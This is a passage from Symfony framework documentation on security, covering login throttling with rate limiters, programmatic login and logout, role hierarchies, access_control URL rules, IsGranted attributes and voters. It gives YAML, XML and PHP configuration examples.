                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <!-- you must use the authenticator manager -->
            <config enable-authenticator-manager="true">
                <!-- ... -->

                <firewall name="main">
                    <!-- by default, the feature allows 5 login attempts per minute
                         max-attempts: (optional) You can configure the maximum attempts ...
                         interval:     (optional) ... and the period of time. -->
                    <login-throttling max-attempts="3" interval="15 minutes"/>

                    <!-- use a custom rate limiter via its service ID -->
                    <login-throttling limiter="app.my_login_rate_limiter"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->enableAuthenticatorManager(true);

            $mainFirewall = $security->firewall('main');

            // by default, the feature allows 5 login attempts per minute
            $mainFirewall->loginThrottling()
                // ->maxAttempts(3)         // Optional: You can configure the maximum attempts ...
                // ->interval('15 minutes') // ... and the period of time.
            ;
        };

.. note::

    The value of the ``interval`` option must be a number followed by any of the
    units accepted by the `PHP date relative formats`_ (e.g. ``3 seconds``,
    ``10 hours``, ``1 day``, etc.)

Internally, Symfony uses the :doc:`Rate Limiter component </rate_limiter>`
which by default uses Symfony's cache to store the previous login attempts.
However, you can implement a :ref:`custom storage <rate-limiter-storage>`.

Login attempts are limited on ``max_attempts`` (default: 5)
failed requests for ``IP address + username`` and ``5 * max_attempts``
failed requests for ``IP address``. The second limit protects against an
attacker using multiple usernames from bypassing the first limit, without
disrupting normal users on big networks (such as offices).

.. tip::

    Limiting the failed login attempts is only one basic protection against
    brute force attacks. The `OWASP Brute Force Attacks`_ guidelines mention
    several other protections that you should consider depending on the
    level of protection required.

If you need a more complex limiting algorithm, create a class that implements
:class:`Symfony\\Component\\HttpFoundation\\RateLimiter\\RequestRateLimiterInterface`
(or use
:class:`Symfony\\Component\\Security\\Http\\RateLimiter\\DefaultLoginRateLimiter`)
and set the ``limiter`` option to its service ID:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        framework:
            rate_limiter:
                # define 2 rate limiters (one for username+IP, the other for IP)
                username_ip_login:
                    policy: token_bucket
                    limit: 5
                    rate: { interval: '5 minutes' }

                ip_login:
                    policy: sliding_window
                    limit: 50
                    interval: '15 minutes'

        services:
            # our custom login rate limiter
            app.login_rate_limiter:
                class: Symfony\Component\Security\Http\RateLimiter\DefaultLoginRateLimiter
                arguments:
                    # globalFactory is the limiter for IP
                    $globalFactory: '@limiter.ip_login'
                    # localFactory is the limiter for username+IP
                    $localFactory: '@limiter.username_ip_login'
                    $secret: '%kernel.secret%'

        security:
            firewalls:
                main:
                    # use a custom rate limiter via its service ID
                    login_throttling:
                        limiter: app.login_rate_limiter

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <framework:config>
                <framework:rate-limiter>
                    <!-- define 2 rate limiters (one for username+IP, the other for IP) -->
                    <framework:limiter name="username_ip_login"
                        policy="token_bucket"
                        limit="5"
                    >
                        <framework:rate interval="5 minutes"/>
                    </framework:limiter>

                    <framework:limiter name="ip_login"
                        policy="sliding_window"
                        limit="50"
                        interval="15 minutes"
                    />
                </framework:rate-limiter>
            </framework:config>

            <srv:services>
                <!-- our custom login rate limiter -->
                <srv:service id="app.login_rate_limiter"
                    class="Symfony\Component\Security\Http\RateLimiter\DefaultLoginRateLimiter"
                >
                    <!-- 1st argument is the limiter for IP -->
                    <srv:argument type="service" id="limiter.ip_login"/>
                    <!-- 2nd argument is the limiter for username+IP -->
                    <srv:argument type="service" id="limiter.username_ip_login"/>
                    <!-- 3rd argument is the app secret -->
                    <srv:argument type="string">%kernel.secret%</srv:argument>
                </srv:service>
            </srv:services>

            <config>
                <firewall name="main">
                    <!-- use a custom rate limiter via its service ID -->
                    <login-throttling limiter="app.login_rate_limiter"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Component\DependencyInjection\ContainerBuilder;
        use Symfony\Component\DependencyInjection\Reference;
        use Symfony\Component\Security\Http\RateLimiter\DefaultLoginRateLimiter;
        use Symfony\Config\FrameworkConfig;
        use Symfony\Config\SecurityConfig;

        return static function (ContainerBuilder $container, FrameworkConfig $framework, SecurityConfig $security): void {
            $framework->rateLimiter()
                ->limiter('username_ip_login')
                    ->policy('token_bucket')
                    ->limit(5)
                    ->rate()
                        ->interval('5 minutes')
            ;

            $framework->rateLimiter()
                ->limiter('ip_login')
                    ->policy('sliding_window')
                    ->limit(50)
                    ->interval('15 minutes')
            ;

            $container->register('app.login_rate_limiter', DefaultLoginRateLimiter::class)
                ->setArguments([
                    // 1st argument is the limiter for IP
                    new Reference('limiter.ip_login'),
                    // 2nd argument is the limiter for username+IP
                    new Reference('limiter.username_ip_login'),
                    // 3rd argument is the app secret
                    param('kernel.secret'),
                ]);

            $security->firewall('main')
                ->loginThrottling()
                    ->limiter('app.login_rate_limiter')
            ;
        };

Customize Successful and Failed Authentication Behavior
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you want to customize how the successful or failed authentication process is
handled, you don't have to overwrite the respective listeners globally. Instead,
you can set custom success failure handlers by implementing the
:class:`Symfony\\Component\\Security\\Http\\Authentication\\AuthenticationSuccessHandlerInterface`
or the
:class:`Symfony\\Component\\Security\\Http\\Authentication\\AuthenticationFailureHandlerInterface`.

Read :ref:`how to customize your success handler <login-link_customize-success-handler>`
for more information about this.

Login Programmatically
----------------------

You can log in a user programmatically using the ``login()`` method of the
:class:`Symfony\\Bundle\\SecurityBundle\\Security` helper::

    // src/Controller/SecurityController.php
    namespace App\Controller\SecurityController;

    use App\Security\Authenticator\ExampleAuthenticator;
    use Symfony\Bundle\SecurityBundle\Security;
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\RememberMeBadge;

    class SecurityController
    {
        public function someAction(Security $security): Response
        {
            // get the user to be authenticated
            $user = ...;

            // log the user in on the current firewall
            $security->login($user);

            // if the firewall has more than one authenticator, you must pass it explicitly
            // by using the name of built-in authenticators...
            $security->login($user, 'form_login');
            // ...or the service id of custom authenticators
            $security->login($user, ExampleAuthenticator::class);

            // you can also log in on a different firewall...
            $security->login($user, 'form_login', 'other_firewall');

            // ...and add badges
            $security->login($user, 'form_login', 'other_firewall', [(new RememberMeBadge())->enable()]);

            // use the redirection logic applied to regular login
            $redirectResponse = $security->login($user);
            return $redirectResponse;

            // or use a custom redirection logic (e.g. redirect users to their account page)
            // return new RedirectResponse('...');
        }
    }

.. _security-logging-out:

Logging Out
-----------

To enable logging out, activate the  ``logout`` config parameter under your firewall:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    logout:
                        path: /logout

                        # where to redirect after logout
                        # target: app_any_route

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <logout path="/logout"/>

                    <!-- use "target" to configure where to redirect after logout
                    <logout path="/logout" target="app_any_route"/>
                    -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $mainFirewall = $security->firewall('main');
            // ...
            $mainFirewall->logout()
                ->path('/logout')

                // where to redirect after logout
                // ->target('app_any_route')
            ;
        };

Symfony will then un-authenticate users navigating to the configured ``path``,
and redirect them to the configured ``target``.

.. tip::

    If you need to reference the logout path, you can use the ``_logout_<firewallname>``
    route name (e.g. ``_logout_main``).

If your project does not use :ref:`Symfony Flex <symfony-flex>`, make sure
you have imported the logout route loader in your routes:

.. configuration-block::

    .. code-block:: yaml

        # config/routes/security.yaml
        _symfony_logout:
            resource: security.route_loader.logout
            type: service

    .. code-block:: xml

        <!-- config/routes/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <import resource="security.route_loader.logout" type="service"/>
        </routes>

    .. code-block:: php

        // config/routes/security.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->import('security.route_loader.logout', 'service');
        };

Logout programmatically
~~~~~~~~~~~~~~~~~~~~~~~

You can logout user programmatically using the ``logout()`` method of the
:class:`Symfony\\Bundle\\SecurityBundle\\Security` helper::

    // src/Controller/SecurityController.php
    namespace App\Controller\SecurityController;

    use Symfony\Bundle\SecurityBundle\Security;

    class SecurityController
    {
        public function someAction(Security $security): Response
        {
            // logout the user in on the current firewall
            $response = $security->logout();

            // you can also disable the csrf logout
            $response = $security->logout(false);

            // ... return $response (if set) or e.g. redirect to the homepage
        }
    }

The user will be logged out from the firewall of the request. If the request is
not behind a firewall a ``\LogicException`` will be thrown.

Customizing Logout
~~~~~~~~~~~~~~~~~~

In some cases you need to run extra logic upon logout (e.g. invalidate
some tokens) or want to customize what happens after a logout. During
logout, a :class:`Symfony\\Component\\Security\\Http\\Event\\LogoutEvent`
is dispatched. Register an :doc:`event listener or subscriber </event_dispatcher>`
to execute custom logic::

    // src/EventListener/LogoutSubscriber.php
    namespace App\EventListener;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpFoundation\RedirectResponse;
    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
    use Symfony\Component\Security\Http\Event\LogoutEvent;

    class LogoutSubscriber implements EventSubscriberInterface
    {
        public function __construct(
            private UrlGeneratorInterface $urlGenerator
        ) {
        }

        public static function getSubscribedEvents(): array
        {
            return [LogoutEvent::class => 'onLogout'];
        }

        public function onLogout(LogoutEvent $event): void
        {
            // get the security token of the session that is about to be logged out
            $token = $event->getToken();

            // get the current request
            $request = $event->getRequest();

            // get the current response, if it is already set by another listener
            $response = $event->getResponse();

            // configure a custom logout response to the homepage
            $response = new RedirectResponse(
                $this->urlGenerator->generate('homepage'),
                RedirectResponse::HTTP_SEE_OTHER
            );
            $event->setResponse($response);
        }
    }

Customizing Logout Path
~~~~~~~~~~~~~~~~~~~~~~~

Another option is to configure ``path`` as a route name. This can be useful
if you want logout URIs to be dynamic (e.g. translated according to the
current locale). In that case, you have to create this route yourself:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        app_logout:
            path:
                en: /logout
                fr: /deconnexion
            methods: GET

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="app_logout" path="/logout" methods="GET">
                <path locale="en">/logout</path>
                <path locale="fr">/deconnexion</path>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('app_logout', [
                'en' => '/logout',
                'fr' => '/deconnexion',
            ])
                ->methods(['GET'])
            ;
        };

Then, pass the route name to the ``path`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    logout:
                        path: app_logout

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <logout path="app_logout"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $mainFirewall = $security->firewall('main');
            // ...
            $mainFirewall->logout()
                ->path('app_logout')
            ;
        };

.. _retrieving-the-user-object:

Fetching the User Object
------------------------

After authentication, the ``User`` object of the current user can be
accessed via the ``getUser()`` shortcut in the
:ref:`base controller <the-base-controller-class-services>`::

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class ProfileController extends AbstractController
    {
        public function index(): Response
        {
            // usually you'll want to make sure the user is authenticated first,
            // see "Authorization" below
            $this->denyAccessUnlessGranted('IS_AUTHENTICATED_FULLY');

            // returns your User object, or null if the user is not authenticated
            // use inline documentation to tell your editor your exact User class
            /** @var \App\Entity\User $user */
            $user = $this->getUser();

            // Call whatever methods you've added to your User class
            // For example, if you added a getFirstName() method, you can use that.
            return new Response('Well hi there '.$user->getFirstName());
        }
    }

Fetching the User from a Service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to get the logged in user from a service, use the
:class:`Symfony\\Bundle\\SecurityBundle\\Security` service::

    // src/Service/ExampleService.php
    // ...

    use Symfony\Bundle\SecurityBundle\Security;

    class ExampleService
    {
        // Avoid calling getUser() in the constructor: auth may not
        // be complete yet. Instead, store the entire Security object.
        public function __construct(
            private Security $security,
        ){
        }

        public function someMethod(): void
        {
            // returns User object or null if not authenticated
            $user = $this->security->getUser();

            // ...
        }
    }

Fetch the User in a Template
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In a Twig Template the user object is available via the ``app.user`` variable
thanks to the :ref:`Twig global app variable <twig-app-variable>`:

.. code-block:: html+twig

    {% if is_granted('IS_AUTHENTICATED_FULLY') %}
        <p>Email: {{ app.user.email }}</p>
    {% endif %}

.. _denying-access-roles-and-other-authorization:
.. _security-access-control:

Access Control (Authorization)
------------------------------

Users can now log in to your app using your login form. Great! Now, you need to learn
how to deny access and work with the User object. This is called **authorization**,
and its job is to decide if a user can access some resource (a URL, a model object,
a method call, ...).

The process of authorization has two different sides:

#. The user receives a specific role when logging in (e.g. ``ROLE_ADMIN``).
#. You add code so that a resource (e.g. URL, controller) requires a specific
   "attribute" (e.g. a role like ``ROLE_ADMIN``) in order to be accessed.

Roles
~~~~~

When a user logs in, Symfony calls the ``getRoles()`` method on your ``User``
object to determine which roles this user has. In the ``User`` class that
was generated earlier, the roles are an array that's stored in the
database and every user is *always* given at least one role: ``ROLE_USER``::

    // src/Entity/User.php

    // ...
    class User
    {
        #[ORM\Column(type: 'json')]
        private array $roles = [];

        // ...
        public function getRoles(): array
        {
            $roles = $this->roles;
            // guarantee every user at least has ROLE_USER
            $roles[] = 'ROLE_USER';

            return array_unique($roles);
        }
    }

This is a nice default, but you can do *whatever* you want to determine which roles
a user should have. The only rule is that every role **must start with** the
``ROLE_`` prefix - otherwise, things won't work as expected. Other than that,
a role is just a string and you can invent whatever you need (e.g. ``ROLE_PRODUCT_ADMIN``).

You'll use these roles next to grant access to specific sections of your site.

.. _security-role-hierarchy:

Hierarchical Roles
..................

Instead of giving many roles to each user, you can define role inheritance
rules by creating a role hierarchy:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            role_hierarchy:
                ROLE_ADMIN:       ROLE_USER
                ROLE_SUPER_ADMIN: [ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <role id="ROLE_ADMIN">ROLE_USER</role>
                <role id="ROLE_SUPER_ADMIN">ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH</role>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->roleHierarchy('ROLE_ADMIN', ['ROLE_USER']);
            $security->roleHierarchy('ROLE_SUPER_ADMIN', ['ROLE_ADMIN', 'ROLE_ALLOWED_TO_SWITCH']);
        };

Users with the ``ROLE_ADMIN`` role will also have the ``ROLE_USER`` role.
Users with ``ROLE_SUPER_ADMIN``, will automatically have ``ROLE_ADMIN``,
``ROLE_ALLOWED_TO_SWITCH`` and ``ROLE_USER`` (inherited from
``ROLE_ADMIN``).

.. caution::

    For role hierarchy to work, do not use ``$user->getRoles()`` manually.
    For example, in a controller extending from the :ref:`base controller <the-base-controller-class-services>`::

        // BAD - $user->getRoles() will not know about the role hierarchy
        $hasAccess = in_array('ROLE_ADMIN', $user->getRoles());

        // GOOD - use of the normal security methods
        $hasAccess = $this->isGranted('ROLE_ADMIN');
        $this->denyAccessUnlessGranted('ROLE_ADMIN');

.. note::

    The ``role_hierarchy`` values are static - you can't, for example, store the
    role hierarchy in a database. If you need that, create a custom
    :doc:`security voter </security/voters>` that looks for the user roles
    in the database.

.. _security-role-authorization:

Add Code to Deny Access
~~~~~~~~~~~~~~~~~~~~~~~

There are **two** ways to deny access to something:

#. :ref:`access_control in security.yaml <security-authorization-access-control>`
   allows you to protect URL patterns (e.g. ``/admin/*``). Simpler, but less flexible;

#. :ref:`in your controller (or other code) <security-securing-controller>`.

.. _security-authorization-access-control:

Securing URL patterns (access_control)
......................................

The most basic way to secure part of your app is to secure an entire URL pattern
in ``security.yaml``. For example, to require ``ROLE_ADMIN`` for all URLs that
start with ``/admin``, you can:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                # ...
                main:
                    # ...

            access_control:
                # require ROLE_ADMIN for /admin*
                - { path: '^/admin', roles: ROLE_ADMIN }

                # or require ROLE_ADMIN or IS_AUTHENTICATED_FULLY for /admin*
                - { path: '^/admin', roles: [IS_AUTHENTICATED_FULLY, ROLE_ADMIN] }

                # the 'path' value can be any valid regular expression
                # (this one will match URLs like /api/post/7298 and /api/comment/528491)
                - { path: ^/api/(post|comment)/\d+$, roles: ROLE_USER }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                </firewall>

                <!-- require ROLE_ADMIN for /admin* -->
                <rule path="^/admin" role="ROLE_ADMIN"/>

                <!-- require ROLE_ADMIN or IS_AUTHENTICATED_FULLY for /admin* -->
                <rule path="^/admin">
                    <role>ROLE_ADMIN</role>
                    <role>IS_AUTHENTICATED_FULLY</role>
                </rule>

                <!-- the 'path' value can be any valid regular expression
                     (this one will match URLs like /api/post/7298 and /api/comment/528491) -->
                <rule path="^/api/(post|comment)/\d+$" role="ROLE_USER"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->enableAuthenticatorManager(true);

            // ...
            $security->firewall('main')
            // ...
            ;

            // require ROLE_ADMIN for /admin*
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_ADMIN']);

            // require ROLE_ADMIN or IS_AUTHENTICATED_FULLY for /admin*
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_ADMIN', 'IS_AUTHENTICATED_FULLY']);

            // the 'path' value can be any valid regular expression
            // (this one will match URLs like /api/post/7298 and /api/comment/528491)
            $security->accessControl()
                ->path('^/api/(post|comment)/\d+$')
                ->roles(['ROLE_USER']);
        };

You can define as many URL patterns as you need - each is a regular expression.
**BUT**, only **one** will be matched per request: Symfony starts at the top of
the list and stops when it finds the first match:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            access_control:
                # matches /admin/users/*
                - { path: '^/admin/users', roles: ROLE_SUPER_ADMIN }

                # matches /admin/* except for anything matching the above rule
                - { path: '^/admin', roles: ROLE_ADMIN }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <rule path="^/admin/users" role="ROLE_SUPER_ADMIN"/>
                <rule path="^/admin" role="ROLE_ADMIN"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->accessControl()
                ->path('^/admin/users')
                ->roles(['ROLE_SUPER_ADMIN']);

            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_ADMIN']);
        };

Prepending the path with ``^`` means that only URLs *beginning* with the
pattern are matched. For example, a path of ``/admin`` (without the ``^``)
would match ``/admin/foo`` but would also match URLs like ``/foo/admin``.

Each ``access_control`` can also match on IP address, hostname and HTTP methods.
It can also be used to redirect a user to the ``https`` version of a URL pattern.
For more complex needs, you can also use a service implementing ``RequestMatcherInterface``.

See :doc:`/security/access_control`.

.. _security-securing-controller:

Securing Controllers and other Code
...................................

You can deny access from inside a controller::

    // src/Controller/AdminController.php
    // ...

    public function adminDashboard(): Response
    {
        $this->denyAccessUnlessGranted('ROLE_ADMIN');

        // or add an optional message - seen by developers
        $this->denyAccessUnlessGranted('ROLE_ADMIN', null, 'User tried to access a page without having ROLE_ADMIN');
    }

That's it! If access is not granted, a special
:class:`Symfony\\Component\\Security\\Core\\Exception\\AccessDeniedException`
is thrown and no more code in your controller is called. Then, one of two things
will happen:

1) If the user isn't logged in yet, they will be asked to log in (e.g. redirected
   to the login page).

2) If the user *is* logged in, but does *not* have the ``ROLE_ADMIN`` role, they'll
   be shown the 403 access denied page (which you can
   :ref:`customize <controller-error-pages-by-status-code>`).

.. _security-securing-controller-annotations:
.. _security-securing-controller-attributes:

Another way to secure one or more controller actions is to use the ``#[IsGranted()]`` attribute.
In the following example, all controller actions will require the
``ROLE_ADMIN`` permission, except for ``adminDashboard()``, which will require
the ``ROLE_SUPER_ADMIN`` permission:

.. code-block:: php-attributes

    // src/Controller/AdminController.php
    // ...

    use Symfony\Component\Security\Http\Attribute\IsGranted;

    #[IsGranted('ROLE_ADMIN')]
    class AdminController extends AbstractController
    {
        // Optionally, you can set a custom message that will be displayed to the user
        #[IsGranted('ROLE_SUPER_ADMIN', message: 'You are not allowed to access the admin dashboard.')]
        public function adminDashboard(): Response
        {
            // ...
        }
    }

If you want to use a custom status code instead of the default one (which
is 403), this can be done by setting with the ``statusCode`` argument::

    // src/Controller/AdminController.php
    // ...

    use Symfony\Component\Security\Http\Attribute\IsGranted;

    #[IsGranted('ROLE_ADMIN', statusCode: 423)]
    class AdminController extends AbstractController
    {
        // ...
    }

You can also set the internal exception code of the
:class:`Symfony\\Component\\Security\\Core\\Exception\\AccessDeniedException`
that is thrown with the ``exceptionCode`` argument::

    // src/Controller/AdminController.php
    // ...

    use Symfony\Component\Security\Http\Attribute\IsGranted;

    #[IsGranted('ROLE_ADMIN', statusCode: 403, exceptionCode: 10010)]
    class AdminController extends AbstractController
    {
        // ...
    }

.. _security-template:

Access Control in Templates
...........................

If you want to check if the current user has a certain role, you can use
the built-in ``is_granted()`` helper function in any Twig template:

.. code-block:: html+twig

    {% if is_granted('ROLE_ADMIN') %}
        <a href="...">Delete</a>
    {% endif %}

.. _security-isgranted:

Securing other Services
.......................

You can check access *anywhere* in your code by injecting the ``Security``
service. For example, suppose you have a ``SalesReportManager`` service and you
want to include extra details only for users that have a ``ROLE_SALES_ADMIN`` role:

.. code-block:: diff

      // src/SalesReport/SalesReportManager.php

      // ...
      use Symfony\Component\Security\Core\Exception\AccessDeniedException;
    + use Symfony\Bundle\SecurityBundle\Security;

      class SalesReportManager
      {
    +     public function __construct(
    +         Security $security,
    +     ) {
    +     }

          public function generateReport(): void
          {
              $salesData = [];

    +         if ($this->security->isGranted('ROLE_SALES_ADMIN')) {
    +             $salesData['top_secret_numbers'] = rand();
    +         }

              // ...
          }

          // ...
      }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
Symfony will automatically pass the ``security.helper`` to your service
thanks to autowiring and the ``Security`` type-hint.

You can also use a lower-level
:class:`Symfony\\Component\\Security\\Core\\Authorization\\AuthorizationCheckerInterface`
service. It does the same thing as ``Security``, but allows you to type-hint a
more-specific interface.

Allowing Unsecured Access (i.e. Anonymous Users)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When a visitor isn't yet logged in to your website, they are treated as
"unauthenticated" and don't have any roles. This will block them from
visiting your pages if you defined an ``access_control`` rule.

In the ``access_control`` configuration, you can use the ``PUBLIC_ACCESS``
security attribute to exclude some routes for unauthenticated access (e.g.
the login page):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:

            # ...
            access_control:
                # allow unauthenticated users to access the login form
                - { path: ^/admin/login, roles: PUBLIC_ACCESS }

                # but require authentication for all other admin routes
                - { path: ^/admin, roles: ROLE_ADMIN }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config enable-authenticator-manager="true">
                <!-- ... -->

                <access-control>
                    <!-- allow unauthenticated users to access the login form -->
                    <rule path="^/admin/login" role="PUBLIC_ACCESS"/>

                    <!-- but require authentication for all other admin routes -->
                    <rule path="^/admin" role="ROLE_ADMIN"/>
                </access-control>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Component\Security\Core\Authorization\Voter\AuthenticatedVoter;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->enableAuthenticatorManager(true);
            // ....

            // allow unauthenticated users to access the login form
            $security->accessControl()
                ->path('^/admin/login')
                ->roles([AuthenticatedVoter::PUBLIC_ACCESS])
            ;

            // but require authentication for all other admin routes
            $security->accessControl()
                ->path('^/admin')
                ->roles(['ROLE_ADMIN'])
            ;
        };

Granting Anonymous Users Access in a Custom Voter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you're using a :doc:`custom voter </security/voters>`, you can allow
anonymous users access by checking if there is no user set on the token::

    // src/Security/PostVoter.php
    namespace App\Security;

    // ...
    use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
    use Symfony\Component\Security\Core\Authentication\User\UserInterface;
    use Symfony\Component\Security\Core\Authorization\Voter\Voter;

    class PostVoter extends Voter
    {
        // ...

        protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token): bool
        {
            // ...

            if (!$token->getUser() instanceof UserInterface) {
                // the user is not authenticated, e.g. only allow them to
                // see public posts
                return $subject->isPublic();
            }
        }
    }

Setting Individual User Permissions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Most applications require more specific access rules. For instance, a user
should be able to only edit their *own* comments on a blog. Voters allow you
to write *whatever* business logic you need to determine access. Using
these voters is similar to the role-based access checks implemented in the
previous chapters. Read :doc:`/security/voters` to learn how to implement
your own voter.

.. _checking-to-see-if-a-user-is-logged-in-is-authenticated-fully:

Checking to see if a User is Logged In
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you *only* want to check if a user is logged in (you don't care about roles),
you have the following two options.

Firstly, if you've given *every* user ``ROLE_USER``, you can check for that role.

Secondly, you can use the special "attribute" ``IS_AUTHENTICATED_FULLY`` in place of a role::

    // ...

    public function adminDashboard(): Response
    {
        $this->denyAccessUnlessGranted('IS_AUTHENTICATED');

        // ...
    }

